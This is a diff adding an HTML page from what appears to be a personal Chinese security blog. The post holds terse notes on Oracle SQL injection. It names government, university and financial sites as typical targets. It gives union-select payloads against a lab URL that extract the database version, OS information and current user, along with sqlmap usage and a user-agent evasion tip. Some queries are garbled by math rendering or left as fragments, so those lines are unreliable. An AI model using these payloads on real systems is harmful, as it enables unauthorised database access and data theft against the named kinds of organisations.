@@ -1,0 +1,257 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>oracle注入 | pony686</title>
+<link rel="shortcut icon" href="https://itxz.fun/favicon.ico?v=1601777037443">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://itxz.fun/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="oracle注入 | pony686 - Atom Feed" href="https://itxz.fun/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="oracle
+db2
+适用与比较大的站点
+政府机关站点
+大学
+金融 证券
+旅游站点
+jsp+oracle 存在注入
+手工
+几十张表
+bool盲注
+ascii
+工具跑
+/
+-0
+and 1=1
+and 1=2
+asp/aspx/jsp+ora..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://itxz.fun">
+  <img class="avatar" src="https://itxz.fun/images/avatar.png?v=1601777037443" alt="">
+  </a>
+  <h1 class="site-title">
+    pony686
+  </h1>
+  <p class="site-description">
+    pony686
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          python
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://itxz.fun" class="menu" target="_blank">
+          web安全
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              oracle注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-09-08
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>oracle<br>
+db2<br>
+适用与比较大的站点</p>
+<p>政府机关站点<br>
+大学<br>
+金融 证券<br>
+旅游站点</p>
+<p>jsp+oracle 存在注入</p>
+<p>手工<br>
+几十张表<br>
+bool盲注<br>
+ascii<br>
+工具跑<br>
+/<br>
+-0<br>
+and 1=1<br>
+and 1=2<br>
+asp/aspx/jsp+oracle</p>
+<p>oracle数据库介绍<br>
+Oracle数据库系统是美国ORACLE公司（甲骨文）提供的以分布式数据库为核心的一组软件产品。是目前世界上使用最为广泛的数据库管理系统。基于“客户端/服务器”模式结构，客户端应用程序与用户交互，接收用户信息，并向服务器发送请求，服务器系统负责管理数据信息和各种操作数据的活动。<br>
+特点<br>
+    1 支持多用户、大事务量的处理<br>
+    2 数据安全性和完整性的有效控制<br>
+    3 支持分布式数据处理<br>
+    4 移植性强</p>
+<p>判断数据库<br>
+判断注入<br>
+and 1=1<br>
+and 1=2<br>
+判断oracle数据库<br>
+and exists(select * from dual)<br>
+and exists(select * from user_tables)</p>
+<p>判断列数<br>
+order by 11   返回正常<br>
+order by 12    返回错误<br>
+union select null，null，null，null，null</p>
+<p>获取数据类型不匹配的列<br>
+http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,null,null,null,null,null,null,null,null,null,null from dual</p>
+<p>获取数据类型不匹配的列<br>
+在每列上逐个用数字代替 如果返回正常说明该列为数字类型，反之则为非数字类型。<br>
+也可以逐个用引号引起来如：'null',null...from dual, 返回正常说明该列为字符类型，反之为非数字类型</p>
+<p>获取基本信息<br>
+获取数据库版本<br>
+(select banner from sys.v_<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>w</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>e</mi><mi>r</mi><mi>o</mi><mi>w</mi><mi>n</mi><mi>u</mi><mi>m</mi><mo>=</mo><mn>1</mn><mo>)</mo><mi mathvariant="normal">获</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">操</mi><mi mathvariant="normal">作</mi><mi mathvariant="normal">系</mi><mi mathvariant="normal">统</mi><mi mathvariant="normal">版</mi><mi mathvariant="normal">本</mi><mo>(</mo><mi>s</mi><mi>e</mi><mi>l</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>m</mi><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>r</mi><mi>f</mi><mi>r</mi><mi>o</mi><mi>m</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">version where rownum=1)
+获取操作系统版本
+( select member from v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">n</span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">操</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">统</span><span class="mord cjk_fallback">版</span><span class="mord cjk_fallback">本</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span></span>logfile where rownum=1)<br>
+获取连接数据库的当前用户<br>
+( select SYS_CONTEXT ('USERENV','CURRENT_USER')from dual)<br>
+获取数据库<br>
+(select owner from all_tables where rownum=1)</p>
+<p>获取数据库版本<br>
+http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,(select banner from sys.v_$version where rownum=1),null,null,null,null,null,null,null,null,null from dual</p>
+<p>获取操作系统版本<br>
+http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,( select member from v$logfile where rownum=1),null,null,null,null,null,null,null,null,null from dual</p>
+<p>获取连接数据库的当前用户<br>
+http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,( select SYS_CONTEXT ('USERENV','CURRENT_USER')from dual),null,null,null,null,null,null,null,null,null from dual</p>
+<p>order by  10</p>
+<p>union select 1,2',ull,null,null</p>
+<p>admin<br>
+JSSLEDU_MANGER_SYSTEMM</p>
+<p>sqlmap.py - u  &quot;url&quot; ---current -db 列数据库<br>
+sqlmap.py -u &quot;url&quot; -D xxx  --tables 指定数据库列表名<br>
+sqlmap.py -u &quot;url&quot; --current -</p>
+<p>sqlmap<br>
+默认模糊匹配</p>
+<p>google语法<br>
+inurl：php？id=site.jp 商品名称 转换成日语</p>
+<p>mysql root 在windows 权限最高<br>
+在linux只是服务用户权限<br>
+postgresql postgres 具有写入根目录权限<br>
+user-agent：sqlmap.org</p>
+<p>--random -agent<br>
+用户上传<br>
+xss居多<br>
+sql注入<br>
+burp抓包分析请求查找</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://itxz.fun/post/mysql-zhu-ru/">
+              <h3 class="post-title">
+                mysql注入
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://itxz.fun/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
